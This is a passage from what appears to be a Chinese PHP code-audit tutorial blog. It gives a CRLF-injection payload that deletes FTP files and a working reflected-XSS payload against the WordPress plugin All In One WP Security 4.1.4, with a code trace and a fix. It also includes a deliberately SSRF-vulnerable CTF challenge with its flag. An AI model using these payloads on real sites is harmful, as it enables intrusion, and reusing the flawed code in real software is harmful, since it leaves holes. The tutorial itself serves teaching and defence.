<strong>REQUEST</strong> 数据，这显然会存在安全隐患。想了解更多 <a href="http://www.php.net/manual/zh/reserved.variables.request.php"><strong>$_REQUEST</strong></a> 信息，大家自己上官网学习。第二个漏洞的话，在代码 <strong>第21行</strong> ，这里用了 <strong>&#x3D;&#x3D;</strong> 弱比较。关于这个问题，我们在前面的文章中讲的也很细致了，大家可以参考：<a href="https://xz.aliyun.com/t/2491#toc-4">[红日安全]PHP-Audit-Labs题解之Day1-4</a> （Day4）。</p><p>至于本次案例的攻击payload，可以使用： <strong>?mode&#x3D;1%0a%0dDELETE%20test.file</strong> ，这个即可达到删除FTP服务器文件的效果。</p><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们分析的是 <strong>WordPress</strong> 的 <a href="https://cn.wordpress.org/plugins/all-in-one-wp-security-and-firewall/">All In One WP Security &amp; Firewall</a> 插件。该插件在 <strong>4.1.4 - 4.1.9</strong> 版本中存在反射型XSS漏洞，漏洞原因和本次案例中的漏洞成因一致，官方也在 <strong>4.2.0</strong> 版本中修复了该漏洞。本次，我们将以 <strong>4.1.4</strong> 版本插件作为案例讲解。<br>将下载下来的插件zip包，通过后台插件管理上传压缩包安装即可。本次发生问题的文件在于 <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-dashboard-menu.php</strong> ，为了方便大家理解，我将问题代码抽取出来，简化如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AIOWPSecurity_Dashboard_Menu</span> <span class="keyword">extends</span> <span class="title">AIOWPSecurity_Admin_Menu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$menu_tabs_handler</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;tab1&#x27;</span> =&gt; <span class="string">&#x27;render_tab1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab2&#x27;</span> =&gt; <span class="string">&#x27;render_tab2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab3&#x27;</span> =&gt; <span class="string">&#x27;render_tab3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab4&#x27;</span> =&gt; <span class="string">&#x27;render_tab4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab5&#x27;</span> =&gt; <span class="string">&#x27;render_tab5&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_page</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_menu_page</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set_menu_tabs</span>();</span><br><span class="line">        <span class="variable">$tab</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_current_tab</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_tabs</span>();</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;menu_tabs_handler[<span class="variable">$tab</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_tab3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;tab&quot; value=&quot;&#x27;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以很清晰的看到，问题就出在 <strong>第25行</strong> 的 <strong>render_tab3</strong> 方法中，这里直接将 <strong>REQUEST</strong> 方式获取的 <strong>tab</strong> 变量拼接并输出。而实际上，在 <strong>第20行</strong> 已经获取了经过过滤处理的 <strong>$tab</strong> 变量。我们来看一下 <strong>get_current_tab</strong> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_current_tab</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tab_keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;menu_tabs);</span><br><span class="line">    <span class="variable">$tab</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) ? <span class="title function_ invoke__">sanitize_text_field</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) : <span class="variable">$tab_keys</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tab</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤函数的调用链如下图 <strong>第1行</strong> ，接着 <strong>$tab</strong> 变量就会经过 <strong>wp_check_invalid_utf8</strong> 方法的检测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_check_invalid_utf8</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$strip</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = (<span class="keyword">string</span>)<span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Store the site charset as a static to avoid multiple calls to get_option()</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$is_utf8</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$is_utf8</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_utf8</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;blog_charset&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;UTF8&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$is_utf8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for support for utf8 in the installed PCRE library once and store the result in a static</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$utf8_pcre</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$utf8_pcre</span>)) &#123;</span><br><span class="line">        <span class="variable">$utf8_pcre</span> = @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./u&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// We can&#x27;t demand utf8 in the PCRE installation, so just return the string in those cases</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$utf8_pcre</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// preg_match fails when it encounters invalid UTF8 in $string</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./us&#x27;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attempt to strip the bad chars if requested(not recommended)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$strip</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;iconv&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下面我们来看看攻击 <strong>payload</strong> （向 <a href="http://website/wp-admin/admin.php?page=aiowpsec&tab=tab3">http://website/wp-admin/admin.php?page=aiowpsec&amp;tab=tab3</a> POST数据 <code>tab=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ）：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-4.png"></p><p>可以看到成功引发XSS攻击。我们最后再根据 <strong>payload</strong> 对代码的调用过程进行分析。首先，我们的 <strong>payload</strong> 会传入 <strong>wp-admin&#x2F;admin.php</strong> 文件中，最后进入 <strong>第14行</strong> 的 <strong>do_action(‘toplevel_page_aiowpsec’);</strong> 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/admin.php</span></span><br><span class="line"><span class="variable">$page_hook</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">wp_unslash</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">plugin_basename</span>(<span class="variable">$plugin_page</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过get_plugin_page_hook函数处理，$page_hook=&#x27;toplevel_page_aiowpsec&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$plugin_page</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$page_hook</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">do_action</span>(<span class="variable">$page_hook</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <strong>wp-includes&#x2F;plugin.php</strong> 文件中，程序又调用了 <strong>WP_Hook</strong> 类的 <strong>do_action</strong> 方法，该方法调用了自身的 <strong>apply_filters</strong> 方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/plugin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$tag</span>, <span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$wp_filter</span>, <span class="variable">$wp_actions</span>, <span class="variable">$wp_current_filter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$wp_filter</span>[<span class="variable">$tag</span>]-&gt;<span class="title function_ invoke__">do_action</span>();</span><br><span class="line">    <span class="title function_ invoke__">array_pop</span>(<span class="variable">$wp_current_filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wp-includes/class-wp-hook.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;nesting_level) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 <strong>apply_filters</strong> 方法调用了 <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-admin-init.php</strong> 文件的 <strong>handle_dashboard_menu_rendering</strong> 方法，并实例化了一个 <strong>AIOWPSecurity_Dashboard_Menu</strong> 对象。</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-5.png"></p><p>接下来就是开头文章分析的部分</p><p>整个漏洞的攻击链就如下图所示：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-6.png"></p><p>这里还有一个小知识点要提醒大家的是，案例中 <strong>$_REQUEST[“tab”]</strong> 最后取到的是 <strong>$_POST[“tab”]</strong> 的值，而不是 <strong>$_GET[“tab”]</strong> 变量的值。这其实和 <strong>php.ini</strong> 中的 <strong>request_order</strong> 对应的值有关。例如在我的环境中， <strong>request_order</strong> 配置如下：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-7.png"></p><p>这里的 <strong>“GP”</strong> 表示的是 <strong>GET</strong> 和 <strong>POST</strong> ，且顺序从左往右。例如我们同时以 <strong>GET</strong> 和 <strong>POST</strong> 方式传输 <strong>tab</strong> 变量，那么最终用 <strong>$_REQUEST[‘tab’]</strong> 获取到的就是 <strong>$_POST[‘tab’]</strong> 的值。更详细的介绍可以看如下PHP手册的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request_order <span class="keyword">string</span></span><br><span class="line">This directive describes the order in which PHP registers GET, POST <span class="keyword">and</span> Cookie variables into the _REQUEST <span class="keyword">array</span>. Registration is done <span class="keyword">from</span> left to right, newer values override older values.</span><br><span class="line"></span><br><span class="line">If this directive is not set, variables_order is used <span class="keyword">for</span> <span class="variable">$_REQUEST</span> contents.</span><br><span class="line"></span><br><span class="line">Note that the <span class="keyword">default</span> distribution php.ini files does not contain the <span class="string">&#x27;C&#x27;</span> <span class="keyword">for</span> cookies, due to security concerns.</span><br></pre></td></tr></table></figure><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于这个漏洞的修复方案，我们只要使用过滤后的 <strong>$tab</strong> 变量即可，且变量最好经过HTML实体编码后再输出，例如使用 <strong>htmlentities</strong> 函数等。</p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])&#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;real_ip&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">0</span>] AS <span class="variable">$xip</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(10|172\.16|192\.168)\.#&#x27;</span>, <span class="variable">$xip</span>)) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$xip</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rip</span> = <span class="title function_ invoke__">real_ip</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rip</span> === <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;HRCTF&#123;SSRF_can_give_you_flag&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You IP is <span class="subst">&#123;$rip&#125;</span> not 127.0.0.1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Day16的CTF考察的是 SSRF漏洞 ， flag 只有通过 127.0.0.1 的IP去请求 flag.php 文件，才能获得flag。可以看到程序对用户传来的数据，会先使用 safe_request_url 